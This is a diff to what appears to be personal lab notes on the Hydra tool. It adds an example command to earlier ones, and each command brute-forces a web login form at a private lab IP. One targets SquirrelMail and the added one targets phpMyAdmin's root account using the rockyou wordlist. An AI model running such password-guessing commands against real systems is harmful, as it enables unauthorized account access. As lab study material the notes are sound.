@@ -17,3 +17,7 @@ Another Example:
 ```
 hydra -l Kyser -P wordlist.txt 10.10.174.36 -V http-form-post ‘/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect.’
 ```
+And Another Example:
+```
+hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.197.90  http-post-form "/phpmyadmin/index.php:pma_username=root&pma_password=^PASS^&server=1&target=index.php&token=e993beb24a009a9e4f0f7c92c4d63924:#1698 - Access denied for user 'root'@'localhost'"
+```
